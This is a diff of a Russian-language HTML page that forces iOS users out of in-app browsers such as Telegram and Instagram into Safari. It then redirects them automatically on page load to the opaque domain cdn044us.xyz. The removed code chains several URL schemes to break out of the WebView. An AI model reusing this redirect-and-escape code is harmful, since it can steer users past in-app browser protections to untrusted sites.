@@ -5,271 +5,72 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Открытие в Safari</title>
     <style>
-        * {
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-        }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f5f5f7;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #f5f5f7;
             color: #1c1c1e;
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
-            min-height: 100vh;
+            height: 100vh;
             margin: 0;
-            text-align: center;
             padding: 20px;
+            text-align: center;
         }
-        .container {
-            background: #ffffff;
-            padding: 32px 24px;
-            border-radius: 22px;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
-            max-width: 400px;
+        .box {
+            background: #fff;
+            padding: 30px 24px;
+            border-radius: 20px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            max-width: 360px;
             width: 100%;
-            position: relative;
-            z-index: 1;
         }
-        .icon {
-            font-size: 52px;
-            margin-bottom: 14px;
-            line-height: 1;
-        }
-        h1 {
-            font-size: 22px;
-            font-weight: 700;
-            margin: 0 0 12px;
-            letter-spacing: -0.3px;
-        }
-        p {
-            font-size: 15px;
-            color: #636366;
-            margin: 0 0 24px;
-            line-height: 1.5;
-        }
+        .icon { font-size: 46px; margin-bottom: 12px; }
+        h1 { font-size: 20px; margin: 0 0 10px; }
+        p { font-size: 15px; color: #666; margin: 0 0 22px; line-height: 1.4; }
         .btn {
             display: block;
-            background-color: #007aff;
-            color: #ffffff;
-            padding: 16px 24px;
-            border-radius: 14px;
+            background: #007aff;
+            color: #fff;
+            padding: 15px;
+            border-radius: 12px;
             text-decoration: none;
             font-size: 17px;
             font-weight: 600;
-            width: 100%;
-            border: none;
-            cursor: pointer;
-            transition: background-color 0.2s, transform 0.1s;
-            box-shadow: 0 4px 14px rgba(0, 122, 255, 0.3);
         }
-        .btn:active {
-            background-color: #0056b3;
-            transform: scale(0.98);
-        }
-        .copy-btn {
-            display: inline-block;
-            margin-top: 14px;
-            background: transparent;
-            border: none;
-            color: #007aff;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            padding: 8px 12px;
-        }
-
-        /* Оверлей с инструкцией для встроенных браузеров iOS */
-        #ios-prompt {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.86);
-            backdrop-filter: blur(6px);
-            -webkit-backdrop-filter: blur(6px);
-            z-index: 9999;
-            flex-direction: column;
-            align-items: center;
-            justify-content: space-between;
-            padding: 36px 24px 48px;
-            color: #ffffff;
-        }
-        .prompt-top, .prompt-bottom {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            width: 100%;
-        }
-        .prompt-center {
-            background: rgba(255, 255, 255, 0.12);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 18px;
-            padding: 22px 20px;
-            max-width: 330px;
-        }
-        .prompt-title {
-            font-size: 18px;
-            font-weight: 700;
-            margin-bottom: 10px;
-        }
-        .prompt-text {
-            font-size: 15px;
-            line-height: 1.5;
-            color: #e5e5ea;
-        }
-        .arrow-up {
-            font-size: 36px;
-            align-self: flex-end;
-            margin-right: 12px;
-            animation: bounceUp 1.3s infinite ease-in-out;
-        }
-        .arrow-down {
-            font-size: 36px;
-            align-self: flex-end;
-            margin-right: 12px;
-            animation: bounceDown 1.3s infinite ease-in-out;
-        }
-        .prompt-btn {
-            margin-top: 18px;
-            background: #007aff;
-            color: #fff;
-            border: none;
-            border-radius: 12px;
-            padding: 13px 20px;
-            font-size: 15px;
-            font-weight: 600;
-            width: 100%;
-            cursor: pointer;
-        }
-        @keyframes bounceUp {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-        @keyframes bounceDown {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(10px); }
-        }
+        .btn:active { background: #0056b3; }
     </style>
 </head>
 <body>
 
-    <div class="container">
+    <div class="box">
         <div class="icon">🧭</div>
-        <h1>Требуется браузер Safari</h1>
-        <p>Для корректной работы и безопасного перехода откройте эту страницу в стандартном браузере <b>Safari</b>.</p>
-        <a href="https://cdn044us.xyz/" class="btn" id="open-btn">
-            Открыть в Safari
-        </a>
-        <button type="button" class="copy-btn" id="copy-btn">Скопировать ссылку</button>
-    </div>
-
-    <!-- Оверлей с инструкцией для всех встроенных браузеров iOS (Telegram, Instagram, Facebook и др.) -->
-    <div id="ios-prompt">
-        <div class="prompt-top" id="top-arrow-block">
-            <div class="arrow-up">↗️</div>
-        </div>
-
-        <div class="prompt-center">
-            <div class="prompt-title">Откройте страницу в Safari</div>
-            <div class="prompt-text">
-                Нажмите на значок <b>«•••»</b> или <b>«Поделиться»</b> (в углу экрана) и выберите пункт <b>«Открыть в Safari»</b> (Open in Safari).
-            </div>
-            <button type="button" class="prompt-btn" id="force-safari-btn">Попробовать открыть автоматически</button>
-        </div>
-
-        <div class="prompt-bottom" id="bottom-arrow-block">
-            <div class="arrow-down">↘️</div>
-        </div>
+        <h1>Открыть в Safari</h1>
+        <p>Нажмите на кнопку ниже, чтобы продолжить в браузере Safari</p>
+        <a href="x-safari-https://cdn044us.xyz/" class="btn" id="go">Открыть Safari</a>
     </div>
 
     <script>
-        (function () {
-            const TARGET_URL = "https://cdn044us.xyz/";
-            const CLEAN_DOMAIN = TARGET_URL.replace(/^https?:\/\//, "");
-            const ua = navigator.userAgent || navigator.vendor || window.opera || "";
+        const url = "https://cdn044us.xyz/";
+        const safariUrl = "x-safari-https://cdn044us.xyz/";
+        const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
 
-            // 1. Определение iOS (включая современные iPadOS, маскирующиеся под Mac)
-            const isIOS = /iPad|iPhone|iPod/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+        if (isIOS) {
+            // Пробуем автоматически вытолкнуть из WebView Telegram в Safari
+            window.location.href = safariUrl;
+        } else {
+            // Для Android и ПК — обычный переход
+            window.location.replace(url);
+        }
 
-            // 2. Проверка на чистый Safari (не Chrome/CriOS, не Firefox/FxiOS, не Яндекс, не WebView)
-            const isInAppBrowser = /(FBAN|FBAV|Instagram|Telegram|TikTok|BytedanceWebview|Musical_ly|WhatsApp|Viber|Line|Twitter|Snapchat|GSA|CriOS|FxiOS|EdgiOS|OPiOS|YaBrowser)/i.test(ua)
-                || !!window.TelegramWebviewProxy
-                || (isIOS && !/Safari/i.test(ua));
-
-            // 3. Функция принудительного пробития WebView в Safari
-            function forceOpenInSafari() {
-                // Способ А: Официальная схема iOS 15+ / 17+ для принудительного запуска Safari из сторонних приложений
-                const xSafariUrl = "x-safari-https://" + CLEAN_DOMAIN;
-                window.location.href = xSafariUrl;
-
-                // Способ Б: Резервная схема Apple Mobile Safari Tab
-                setTimeout(function () {
-                    window.location.href = "com-apple-mobilesafari-tab:" + TARGET_URL;
-                }, 250);
-
-                // Способ В: Попытка открытия через _system / _blank (срабатывает в ряде WebView)
-                setTimeout(function () {
-                    window.open(TARGET_URL, "_system");
-                }, 500);
+        // При нажатии на кнопку срабатывает прямая ссылка x-safari-https://
+        document.getElementById("go").addEventListener("click", function(e) {
+            if (!isIOS) {
+                e.preventDefault();
+                window.location.href = url;
             }
-
-            if (isIOS && !isInAppBrowser) {
-                // Пользователь УЖЕ в чистом Safari — мгновенно перекидываем на целевой сайт
-                window.location.replace(TARGET_URL);
-            } else if (isIOS && isInAppBrowser) {
-                // Пользователь внутри встроенного браузера (Telegram, FB, IG и т.д.)
-                const promptEl = document.getElementById("ios-prompt");
-                promptEl.style.display = "flex";
-
-                // Адаптируем стрелки: в Facebook/Instagram меню сверху справа, в Telegram — снизу справа
-                const isTopMenuApp = /(FBAN|FBAV|Instagram)/i.test(ua);
-                document.getElementById("top-arrow-block").style.visibility = isTopMenuApp ? "visible" : "hidden";
-                document.getElementById("bottom-arrow-block").style.visibility = isTopMenuApp ? "hidden" : "visible";
-
-                // Пробуем автоматически вытолкнуть в Safari сразу при открытии
-                forceOpenInSafari();
-
-                // Вешаем принудительный запуск на обе кнопки
-                document.getElementById("open-btn").addEventListener("click", function (e) {
-                    e.preventDefault();
-                    forceOpenInSafari();
-                });
-
-                document.getElementById("force-safari-btn").addEventListener("click", function (e) {
-                    e.preventDefault();
-                    forceOpenInSafari();
-                });
-            } else {
-                // Если это не iOS (Android / Desktop) — оставляем экран с требованием Safari,
-                // либо раскомментируйте строку ниже, если для не-iOS нужен обычный редирект:
-                // window.location.replace(TARGET_URL);
-                document.getElementById("open-btn").addEventListener("click", function (e) {
-                    e.preventDefault();
-                    alert("Эта страница доступна только в браузере Apple Safari на iPhone или iPad.");
-                });
-            }
-
-            // Кнопка копирования ссылки на случай жёсткой блокировки WebView
-            document.getElementById("copy-btn").addEventListener("click", function () {
-                const btn = this;
-                if (navigator.clipboard && navigator.clipboard.writeText) {
-                    navigator.clipboard.writeText(TARGET_URL).then(function () {
-                        btn.textContent = "Ссылка скопирована ✓";
-                        setTimeout(() => { btn.textContent = "Скопировать ссылку"; }, 2500);
-                    });
-                } else {
-                    const input = document.createElement("input");
-                    input.value = TARGET_URL;
-                    document.body.appendChild(input);
-                    input.select();
-                    document.execCommand("copy");
-                    document.body.removeChild(input);
-                    btn.textContent = "Ссылка скопирована ✓";
-                    setTimeout(() => { btn.textContent = "Скопировать ссылку"; }, 2500);
-                }
-            });
-        })();
+        });
     </script>
+
 </body>
 </html>
